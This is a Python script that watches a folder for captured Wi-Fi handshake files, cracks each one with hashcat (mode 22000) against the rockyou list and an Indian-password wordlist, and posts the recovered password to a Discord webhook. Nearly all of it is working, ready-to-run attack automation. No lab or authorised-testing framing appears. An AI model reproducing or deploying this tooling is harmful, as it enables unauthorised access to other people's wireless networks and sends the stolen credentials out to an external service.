import time
import subprocess
import os
from pathlib import Path
from dhooks import Webhook
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Discord webhook URL
WEBHOOK_URL = ""  #change this with you discord webhook url

class FileHandler(FileSystemEventHandler):
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    def on_created(self, event):
        if not event.is_directory:
            print("File Received")
            file_path = event.src_path
            crack_handshake(file_path)

def move_file(src, dst):
    try:
        os.rename(src, dst)
        return True
    except Exception as e:
        print(f"Error moving file: {e}")
        return False

def crack_handshake(handshake_path):
    # Moves the handshake file to hashcat directory
    hashcat_dir = r"D:\\Endpoint\\hashcat-6.2.6"  # Update with your actual path
    moved_file = os.path.join(hashcat_dir, os.path.basename(handshake_path))
    print("File moving to hashcat directory")
    if move_file(handshake_path, moved_file):
        print("Moved file to hashcat dir successfully")
        # Start cracking using Hashcat
        wordlist1_path = r"D:\\Endpoint\\hashcat-6.2.6\\indian-passwords.txt"  # Update with your actual path
        wordlist2_path = r"D:\\Endpoint\\hashcat-6.2.6\\rockyou.txt"  #Update with your actual path
        output_file = str(Path(moved_file).with_suffix('.txt'))
        print("Starting hashcat for cracking....")
        
        # Create the command to run Hashcat
        command = ['hashcat', '-m', '22000', moved_file, wordlist1_path, wordlist2_path,"--potfile-disable", '-o', output_file]
        print("Command:", ' '.join(command))  # Print the command before execution
        
        # Run Hashcat and capture output
        try:
            hashcat_output = subprocess.run(command, capture_output=True, text=True, check=True, cwd=hashcat_dir)
            # Check if Hashcat executed successfully
            if hashcat_output.returncode == 0:
                print("Hashcat output saved to:",output_file)
                # Read the output file 
                with open(output_file, 'r') as f:
                    output_content = f.read()
                    print("Handshake captured successfully, Content:", output_content)
                    message = f"Handshake file cracked successfully! Content: {output_content}"

            else:
                print("Status: Exhausted, Password not cracked")
                message = f"Exhausted, Password not cracked: {hashcat_output.stderr}"
        except subprocess.CalledProcessError as e:
            print("Error running Hashcat:", e)
            message = f"Error running Hashcat: {e}"
    else:
        print("Error moving handshake to hashcat directory")
        message = "Error moving handshake file to hashcat directory."

    # Send message to Discord webhook
    webhook = Webhook(WEBHOOK_URL)
    webhook.send(message)
    print("Discord Notification sent")


if __name__ == '__main__':
    # Directory to monitor for new handshake files
    print("Started")
    hc22000_dir = r"D:\\Endpoint\\hc22000"  # Update with your actual path
    event_handler = FileHandler(WEBHOOK_URL)
    observer = Observer()
    print("Waiting for file to receive.....")
    observer.schedule(event_handler, hc22000_dir, recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
